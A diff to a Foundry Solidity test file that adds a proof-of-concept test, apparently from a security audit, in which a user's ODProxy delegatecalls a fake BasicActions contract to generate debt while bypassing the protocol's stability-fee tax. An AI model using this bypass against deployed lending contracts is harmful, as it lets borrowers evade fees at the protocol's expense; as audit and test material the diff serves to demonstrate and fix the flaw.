@@ -8,6 +8,8 @@ import {SafeERC20} from '@openzeppelin/token/ERC20/utils/SafeERC20.sol';
 import {Vault721} from '@contracts/proxies/Vault721.sol';
 import {IODSafeManager} from '@interfaces/proxies/IODSafeManager.sol';
 import {ISAFEEngine} from '@interfaces/ISAFEEngine.sol';
+import {ODProxy} from '@contracts/proxies/ODProxy.sol';
+import {FakeBasicActions} from '@test/nft/anvil/FakeBasicActions.sol';
 
 // forge t --fork-url $URL --match-contract NFTAnvil -vvvvv
 
@@ -146,5 +148,36 @@ contract NFTAnvil is AnvilFork {
     vm.stopPrank();
 
     assertEq(initBal, vault721.balanceOf(owner));
+  }
+
+  function test_GenerateDebtWithoutTax() public {
+    FakeBasicActions fakeBasicActions = new FakeBasicActions();
+    address proxy = proxies[1];
+    bytes32 cType = cTypes[1];
+    uint256 vaultId = vaultIds[proxy][cType];
+
+    bytes memory payload = abi.encodeWithSelector(
+      fakeBasicActions.lockTokenCollateralAndGenerateDebt.selector,
+      address(safeManager),
+      address(taxCollector),
+      address(collateralJoin[cType]),
+      address(coinJoin),
+      vaultId,
+      1,
+      0
+    );
+    vm.startPrank(users[1]);
+
+    // Proxy makes a delegatecall to Malicious BasicAction contract and bypasses the TAX payment
+    ODProxy(proxy).execute(address(fakeBasicActions), payload);
+    genDebt(vaultId, 10, proxy);
+
+    vm.stopPrank();
+
+    IODSafeManager.SAFEData memory sData = safeManager.safeData(vaultId);
+    address safeHandler = sData.safeHandler;
+    ISAFEEngine.SAFE memory SafeEngineData = safeEngine.safes(cType, safeHandler);
+    assertEq(1, SafeEngineData.lockedCollateral);
+    assertEq(10, SafeEngineData.generatedDebt);
   }
 }
